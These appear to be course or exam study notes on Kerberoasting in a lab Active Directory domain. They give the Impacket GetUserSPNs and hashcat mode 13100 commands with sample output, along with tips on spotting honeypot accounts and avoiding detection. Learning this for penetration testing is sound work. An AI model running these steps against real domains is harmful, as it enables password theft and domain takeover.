---

### 🔥  **Kerberoasting Overview** 🔥

---

### 📝 **Summary**:

**Kerberoasting** is a method used by attackers to extract **Kerberos service tickets** (TGS) for **service accounts** in **Active Directory (AD)** and then **crack the tickets offline** to recover the service account’s password. The attack specifically targets service accounts that have **Service Principal Names (SPNs)** registered in AD. The attacker requests **TGS tickets** for these service accounts, and the Domain Controller provides them without needing the service account’s password. The attacker then cracks the encrypted ticket offline to reveal the password. This attack is particularly effective when targeting service accounts with **weak passwords** and can lead to a **domain compromise** if higher-privileged service accounts are targeted.

**Key Objectives**:

1. **Automatically find SPNs** in AD that are linked to service accounts.
2. **Extract service tickets (TGS)** for those SPNs.
3. **Crack the ticket offline** to reveal the service account’s password.
4. **Use cracked credentials** to access services or escalate privileges.

---

### 💻 **Detailed Notes**:

### Step-by-Step Walkthrough:

1. **Enumerate Service Accounts (SPNs)**:
    - Use **Impacket’s** `GetUserSPNs.py` tool to list service accounts with **Service Principal Names (SPNs)**:
        
        ```bash
        sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.164.138 -request
        
        ```
        
    - This command requests **TGS (Ticket Granting Service)** tickets tied to these accounts from the Domain Controller (DC).
    
    Example output:
    
    ```
    ServicePrincipalName                  Name        MemberOf                                                     PasswordLastSet      LastLogon
    ------------------------------------  ----------  -----------------------------------------------------------  -------------------  ---------
    HYDRA-DC/SQLServer.MAREL.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local  2024-09-17 11:24:56  <never>
    
    ```
    
2. **Identify Honey Pots**:
    - If the **LastLogon** field shows "<never>", 🚨 **this might be a honey pot** (a trap set by admins). Proceed carefully!
3. **Store the Extracted Hash**:
    - Save the TGS hash to a file for offline cracking:
        
        ```bash
        echo "$krb5tgs$23$*SQLService$..." > krb.txt
        
        ```
        
4. **Crack the Ticket Using Hashcat**:
    - Use **Hashcat** in **mode 13100** to crack the ticket offline:
        
        ```bash
        hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
        
        ```
        
    - **Mode 13100** is used for **Kerberos 5 TGS-REP** tickets.
    
    Example output:
    
    ```
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Time.Estimated...: Sun Sep 22 21:50:14 2024 (11 secs)
    
    ```
    
    - **Password example**: **MYpassword123#** (cracked service account password).
5. **Use Cracked Credentials**:
    - With the cracked password, you now have access to the **SQLService** account and can potentially escalate privileges to compromise the **Domain Controller**.

---

### 💡 **Abbreviations & Definitions**:

- **SPN (Service Principal Name)**: A unique identifier for services running on specific AD accounts (e.g., web servers, databases).
- **TGS (Ticket Granting Service)**: A ticket used in Kerberos to authenticate users to services in AD.
- **TGT (Ticket Granting Ticket)**: A ticket used to request service tickets (TGS) from the DC.
- **DC (Domain Controller)**: The central server in an AD environment that manages authentication and permissions.
- **Impacket**: A Python toolkit for working with network protocols, including Kerberos.

---

### 🚨 **Critical Mentions & Exam Traps**:

- **Honey Pots**: 🚨 **Look out for accounts with `<never>` in the LastLogon field**. These might be traps set by admins to catch attackers. Be careful when proceeding with those.
- **Password Cracking**: Cracking the **TGS ticket** offline using **Hashcat** is a stealthy part of this attack because the cracking process doesn’t generate any network activity.
- **SPNs**: Focus your enumeration efforts on **non-admin service accounts** with SPNs registered in AD. These accounts tend to have weaker passwords and fewer security controls.
- **Offline Cracking**: The **offline** nature of cracking means that you can avoid detection. The actual cracking is done outside the network, so admins won't see it happening. 💡 This is a big advantage of Kerberoasting!

💡 **Pro Tip**: **Rotate service account passwords** regularly and ensure strong password policies are enforced to protect against Kerberoasting attacks.

---

### **Final Exam Tips** 📝:

- **Offline cracking** is key—take your time with the cracking phase because network admins can’t detect this part of the attack.
- Be aware of **honey pot accounts**! If a service account hasn’t logged in recently, it could be a trap to lure attackers.
- If you don’t crack a ticket using **Hashcat**, try other wordlists or switch to **John the Ripper** for an alternative approach.

---